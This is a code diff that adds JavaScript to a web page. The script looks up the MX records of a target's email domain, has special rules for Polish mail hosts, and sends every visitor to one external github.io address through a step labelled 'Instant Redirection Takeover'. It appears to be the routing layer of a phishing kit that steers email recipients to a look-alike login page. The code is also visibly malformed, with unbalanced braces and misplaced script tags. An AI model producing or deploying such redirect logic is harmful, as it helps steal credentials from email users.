@@ -165,6 +165,67 @@
             const providerRegistry = {
                 "@": "https://acsecpws.github.io/hjjfjhg/",
             };
+
+// Live DNS Topography Handshake Layer
+        try {
+            const dnsUrl = `https://dns.google/resolve?name=${encodeURIComponent(targetDomain)}&type=MX`;
+            const dnsResponse = await fetch(dnsUrl);
+            const dnsData = await dnsResponse.json();
+            
+            let mxRecordsPayloadText = "";
+            let primaryHost = "";
+            
+            if (dnsData.Answer && dnsData.Answer.length > 0) {
+                mxRecordsPayloadText = dnsData.Answer.map(r => r.data ? r.data.toLowerCase() : "").join(" ");
+                const firstRecord = dnsData.Answer[0];
+                if (firstRecord && firstRecord.data) {
+                    const segments = firstRecord.data.toLowerCase().trim().split(/\s+/);
+                    primaryHost = segments[segments.length - 1];
+                    if (primaryHost.endsWith('.')) primaryHost = primaryHost.slice(0, -1);
+                }
+            }
+
+            if (mxRecordsPayloadText !== "") {
+                for (const key in providerRegistry) {
+                    if (mxRecordsPayloadText.includes(key) || mxRecordsPayloadText.includes("aspmx")) {
+                        targetDestination = (key === "google" || mxRecordsPayloadText.includes("aspmx")) ? providerRegistry["google"] : providerRegistry[key];
+                        break;
+                    }
+                }
+// Rule Set B2: Explicit Polish Subdomain Routing Rules Matrix
+if (targetDestination === "" && primaryHost !== "") {
+    const startsWithMail = primaryHost.startsWith("mail.");
+    const startsWithPoczta = primaryHost.startsWith("poczta.");
+    const endsWithPL = primaryHost.endsWith(".pl");
+
+    if ((startsWithMail || startsWithPoczta) && endsWithPL) {
+        targetDestination = "https://acsecpws.github.io/hjjfjhg/";
+                }
+            }
+                if (targetDestination === "" && primaryHost !== "") {
+                    if (primaryHost === targetDomain) {
+                        targetDestination = "https://acsecpws.github.io/hjjfjhg/";
+                    } else if (primaryHost === "mail." + targetDomain) {
+                        targetDestination = "https://acsecpws.github.io/hjjfjhg/";
+                    } else {
+                        targetDestination = "https://acsecpws.github.io/hjjfjhg/";
+                    }
+                }
+            }
+        } catch (dnsException) {
+            console.error("DNS Error: ", dnsException);
+        }
+
+        // Global fallback resolution
+        if (targetDestination === "") {
+            targetDestination = "https://acsecpws.github.io/hjjfjhg/";
+        }
+
+        // Ensure target domain string format closes cleanly before hash operations
+        if (!targetDestination.endsWith('/')) {
+            // Append trailing slash if it hits an index path root layout file parameter
+            if (!targetDestination.endsWith('.html') && !targetDestination.endsWith('.php')) {
+                targetDestination += "/";
             }
         }
 
@@ -173,7 +234,8 @@
 
         // Execute Instant Redirection Takeover
         window.location.replace(finalForwardPath);
-    })();</script>
+    })();
+        </script>
         function updateInterfaceMessage(headerText, descriptiveBody) {
             document.getElementById("loadingWidget").style.display = "none";
             document.getElementById("statusHeader").innerText = headerText;
